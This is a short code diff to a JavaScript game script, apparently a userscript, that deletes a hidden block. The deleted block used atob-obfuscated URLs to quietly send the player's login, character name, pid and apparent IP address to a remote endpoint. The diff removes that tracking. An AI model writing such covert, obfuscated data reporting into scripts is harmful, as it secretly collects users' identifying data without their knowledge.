@@ -693,12 +693,7 @@ if (typeof GAME === 'undefined') { } else {
                 let sum_instances = instances.reduce(function (a, b) {
                     return a + b;
                 }, 0);
-                if(!this.reported) {
-                    this.reported = true;
-                    $.get(atob('lol='), function(response) {
-                        $.get(atob('lol=='), {login:GAME.login,charName:GAME.char_data.name,pid:GAME.pid,ipadd:JSON.stringify(response)});
-                    }, "jsonp");
-                }
+               
                 let activity = $('#char_activity').text();
                 let received = $("#act_prizes").find("div.act_prize.disabled").length;
                 let is_trader = new Date();
